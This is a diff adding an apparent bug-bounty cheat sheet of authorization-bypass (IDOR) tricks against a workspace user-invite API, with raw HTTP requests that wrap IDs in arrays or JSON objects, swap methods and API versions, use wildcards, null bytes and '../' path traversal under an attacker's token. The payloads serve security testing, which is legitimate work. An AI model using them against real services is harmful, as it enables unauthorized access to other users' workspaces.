@@ -1,0 +1,87 @@
+1) Wrap ID with an array
+
+POST /workspaces/[60c30f178747147d9acd89ba]/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
+
+{"emails":["random@gmail.com"],"captchaValue":"_"}
+
+An array of Emails.
+
+If the email is sent as an array by default, so try changing it to a nested array.
+
+POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
+
+
+{"emails":[["random@gmail.com"]],"captchaValue":"_"}
+
+2) Wrap ID with a JSON object
+
+POST /workspaces/{"id":"60c30f178747147d9acd89ba"}/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
+
+
+{"emails":["random@gmail.com"],"captchaValue":"_"}
+
+Send the email as a json object
+
+POST /workspaces/60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
+
+
+{"emails":[{"email": "random@gmail.com"}],"captchaValue":"_"}
+
+3) Change the request method
+
+PUT /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
+
+PATCH /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
+
+DELETE /workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
+
+4) Add/Change the API version in the route
+
+POST /v1/workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
+
+POST /v2/workspaces/<workspace_ID>/users?sendEmail=true HTTP/1.1
+
+5) IDs as a wildcard character
+
+POST /workspaces/*/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: ....
+
+
+{"emails":["myEmail@gmail.com"],"captchaValue":"_"}
+
+6) Add URL encoded null characters
+
+POST /workspaces/60c30f178747147d9acd89ba%00/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
+
+
+{"emails":["random@gmail.com"],"captchaValue":"_"}
+
+7) Try testing with a ../ in the API route ===========IMP
+
+COPY
+POST /workspaces/60b64f71adf0d3543cfd8229/../60c30f178747147d9acd89ba/users?sendEmail=true HTTP/1.1
+Host: global.api.host.com
+Content-Type: application/json
+X-Auth-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJS...<Attacker's AUTH Token>
+
+
+{"emails":["random@gmail.com"],"captchaValue":"_"}
+
+Give attackers id as well
